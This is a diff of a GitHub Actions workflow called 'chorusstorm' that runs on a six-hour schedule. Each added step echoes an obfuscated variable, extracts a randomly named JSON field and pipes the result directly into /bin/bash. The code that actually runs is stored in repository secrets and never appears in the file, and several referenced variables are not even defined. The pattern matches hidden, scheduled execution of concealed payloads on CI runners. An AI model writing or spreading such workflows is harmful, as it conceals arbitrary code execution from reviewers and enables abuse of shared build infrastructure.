@@ -3,16 +3,29 @@ name: chorusstorm
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
-jobs:  # 15068
+    - cron: '36 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: chorusstorm
         env:
-          vyin9738: ${{ secrets.vyin9738 }}
+          upfip356: ${{ secrets.upfip356 }}
         run: |
-          echo $vyin9738 | jq -r .emxt14644 | /bin/bash
-          echo $t03 | jq -r .ajkj484 | /bin/bash
+          echo $upfip356 | jq -r .pqs207 | /bin/bash
+          echo $mnbv0027 | jq -r .uxrfl702 | /bin/bash
+          echo $gpws4291 | jq -r .djj2001 | /bin/bash
+          echo $stv34 | jq -r .wtdc0 | /bin/bash
+          echo $qewzh1864 | jq -r .zx9198 | /bin/bash
+          echo $sv96 | jq -r .ruyb6782 | /bin/bash
+          echo $ze6118 | jq -r .v0 | /bin/bash
+          echo $l8 | jq -r .jhutv9 | /bin/bash
+          echo $iju11 | jq -r .w0 | /bin/bash
+          echo $gb84 | jq -r .q2 | /bin/bash
+          echo $gw89451 | jq -r .v1729 | /bin/bash
+          echo $zh40 | jq -r .elec0 | /bin/bash
+          echo $df15 | jq -r .gd3785 | /bin/bash
+          echo $zkh232 | jq -r .ximg3 | /bin/bash
 
